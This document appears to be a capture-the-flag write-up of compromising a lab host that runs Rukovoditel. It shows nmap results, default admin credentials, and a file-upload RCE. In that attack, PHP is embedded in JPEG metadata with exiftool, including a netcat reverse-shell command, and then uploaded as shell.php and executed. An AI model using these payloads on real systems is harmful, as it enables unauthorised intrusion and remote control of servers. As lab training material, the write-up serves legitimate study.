IP = 10.0.160.153

# Nmap Scan Discovery

```nmap
Connect Scan Timing: About 25.85% done; ETC: 23:53 (0:00:06 remaining)
Nmap scan report for 10.0.160.153
Host is up (0.19s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
80/tcp   open     http        nginx 1.18.0
| http-title: Rukovoditel
|_Requested resource was http://10.0.160.153/index.php?module=users/login
| http-robots.txt: 1 disallowed entry 
|_/
1095/tcp filtered nicelink
5922/tcp filtered unknown
5962/tcp filtered unknown
6788/tcp filtered smc-http
8181/tcp filtered intermapper
8300/tcp filtered tmi
8402/tcp filtered abarsd
9001/tcp filtered tor-orport
```

**Login Credentials**
username = admin
password = admin


This is how it goes, after logging in to the login page, you would be moved to the dashboard directory.
The application has the title *Rukovoditel*. Searching only on it brought up (Rukovoditel RCE exploit) in the search results.

The link to the exploit here;
https://www.exploit-db.com/exploits/51322

The vulnerable point was updating the admin profile picture. The exploit stated mainly to use a jpeg image.

![[Pasted image 20240923014553.png]]


Go and grab any jpeg image from the internet. (preferably name is index.jpeg )
Now, using exiftool type;
```bash
exiftool -overwrite_original -comment="<?php system('id'); ?>" index.jpeg
exiftool -overwrite_original -DocumentName="<?php system('nc <your_ip_address 9999 -e /bin/sh'); ?>" index.jpeg
```

Listen for a callback on the port you port (in my case 9999)
```bash
nc -nlvp 9999
```

Before you continue with anything, convert the jpeg image to base64. This link would help with that;
https://h3yy0.csb.app/

Now, intercept the request and paste the base64 of the image at the img parameter

![[Pasted image 20240923023246.png]]


Change the file name to shell.php and send.
![[Pasted image 20240923023456.png]]

now execute it from /uploads/users/tmp/shell.php


You should get your reverse shell :)

****Flags****
